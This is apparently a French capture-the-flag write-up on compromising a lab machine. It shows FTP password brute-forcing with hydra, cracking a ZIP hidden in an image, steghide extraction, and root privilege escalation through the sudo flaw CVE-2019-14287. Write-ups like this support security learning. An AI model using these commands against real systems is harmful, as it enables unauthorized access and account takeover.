
# Découverte
On a 3 ports ouverts :
- HTTP
- SSH
- FTP

Sur la page web, on comprend qu'il faut modifier le user agent pour accéder au site.
Avec curl en précisant l'option L pour suivre les redirections on a une page différente.
```bash
curl --user-agent 'C' -L http://10.10.3.190
```

On apprend alors que le mot de passe de Chris (codename C) est faible.

# FTP
On cherche alors à brute force son compte sur le FTP
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.3.190
```
Son mdp est : crystal

## Zip caché
On obtient 2 image et une note disant qu'un message est caché dans les images.
En exécutant `strings` sur les images, on comprend qu'une image cache une note.

En fait, l'image n'est pas une image mais un fichier ZIP !
En réalité c'est la concaténation d'une image et d'un fichier Zip.
Le zip est protégé par un mot de passe...

```bash
# Extract zip from image
binwalk -e cutie.png

# Crack hash
zip2john file.zip > ziphash
john ziphash
```
Le mdp est alien
On décode le Zip !

On obtient de nouveau mot de passe : Area51

## Steganographie
Sur la deuxième image, on se rend compte que des info sont caché et protégé par un mot de passe, celui que l'on vient de trouver !
```bash
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
```
On obtient le mot de passe de james : hackerrules!

# SSH
On récupère le flag user et il y a aussi une image d'alien présente sur le bureau que l'on récupère :
```bash
scp james@10.10.3.190:/home/james/Alien_autospy.jpg
```
Avec de l'OSINT et un article sur Foxnews on comprend à quoi correspond l'image.


# Privilege escalation
On regarde si on est dans les sudoers de quelques choses.
```bash
sudo -l
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
Très étrange...
-> Une CVE est associé à cette configuration : CVE-2019-14287.

Trivial à exploiter : ``sudo -u#-1 /bin/bash`
